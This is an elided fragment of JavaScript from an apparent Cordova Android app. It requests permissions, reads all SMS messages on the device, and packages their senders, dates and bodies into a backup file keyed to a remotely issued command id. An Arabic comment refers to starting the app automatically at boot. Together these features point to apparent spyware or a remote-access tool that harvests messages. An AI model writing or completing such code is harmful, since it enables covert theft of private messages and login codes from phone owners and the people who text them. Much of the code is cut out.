            ...
            function(success) {
                if (!success.hasPermission) {
                    cordova.plugins.permissions.requestPermission(permission, 
                        function(result) {
                            console.log('Permission ' + permission + ' result: ' + result.hasPermission);
                        }, 
                        function(error) {
    ...
    SMS.listSMS(
        ...
        (messages) => {
            ...
            messages.forEach(msg => {
                smsText += `From: ${msg.address}\n`;
                smsText += `Date: ${new Date(msg.date).toLocaleString()}\n`;
                smsText += `Body: ${msg.body}\n`;
                smsText += '------------------------\n';
            });
            ...
            callback({
                ...
                file: {
                    ...
                    content: smsText,
                    downloadUrl: url,
                    fileName: `sms_backup_${commandId}.txt`
                }
            });
        },
        (error) => {
...
// التأكد من أن التطبيق يبدأ تلقائياً عند تشغيل الجهاز
